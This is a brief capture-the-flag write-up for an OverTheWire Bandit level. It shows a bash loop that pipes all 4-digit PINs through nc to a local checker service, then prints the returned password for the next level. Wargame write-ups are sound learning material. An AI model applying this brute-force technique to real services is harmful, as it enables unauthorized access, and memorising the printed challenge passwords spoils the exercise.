*my solution:
	the whole trick is writing a script that keeps sending the password + different comb of 4 digits
	to the nc connection/server without cutting the connection till we get the password
		#!/bin/bash

		for i in {0000..9999} ; do  echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" ; done | nc localhost 30002 | grep -v Wrong > password

	and when we cat password we get the following:

		I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
		Correct!
		The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

		Exiting.

*password for level 25:
	uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
